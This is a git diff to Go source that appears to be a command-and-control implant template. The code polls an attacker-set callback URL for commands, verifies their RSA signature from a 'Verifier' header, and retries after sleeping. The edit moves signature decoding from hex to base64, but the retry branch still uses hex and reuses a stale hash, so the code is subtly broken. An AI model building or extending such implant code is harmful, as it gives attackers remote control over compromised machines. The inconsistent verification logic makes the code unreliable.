@@ -6,6 +6,7 @@ import (
 	"crypto/sha256"
 	"crypto/tls"
 	"crypto/x509"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/pem"
 	"fmt"
@@ -182,13 +183,15 @@ func main() {
 		//string_contents := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
 		string_contents := strings.Fields(sb) // idk how I never heard of the Fields method
 
-		h := sha256.New()
-		h.Write([]byte(sb))
+		hash_test := sha256.Sum256([]byte(sb))
 		// After verifying we have a command to execute, we now need to grab the commands signature
 		// This is stored in a header value of the request
 		rawSignature := resp.Header.Get("Verifier")
-		signature, _ := hex.DecodeString(rawSignature)
-		err = rsa.VerifyPKCS1v15(pubkey.(*rsa.PublicKey), crypto.SHA256, h.Sum(nil), signature)
+		//fmt.Println(rawSignature)
+		signature_bytes, _ := base64.StdEncoding.DecodeString(rawSignature)
+
+		err = rsa.VerifyPKCS1v15(pubkey.(*rsa.PublicKey), crypto.SHA256, hash_test[:], signature_bytes)
+
 		if err != nil {
 			time.Sleep(time.Duration(sleepTime) * time.Second)
 			req, _ = http.NewRequest("GET", "{{.CallBack}}/session", nil)
@@ -198,7 +201,7 @@ func main() {
 			sb = string(body)
 			rawSignature := resp.Header.Get("Verifier")
 			signature, _ := hex.DecodeString(rawSignature)
-			err = rsa.VerifyPKCS1v15(pubkey.(*rsa.PublicKey), crypto.SHA256, h.Sum(nil), signature)
+			err = rsa.VerifyPKCS1v15(pubkey.(*rsa.PublicKey), crypto.SHA256, hash_test[:], signature)
 		}
 
 		// We are turning this into a switch statement
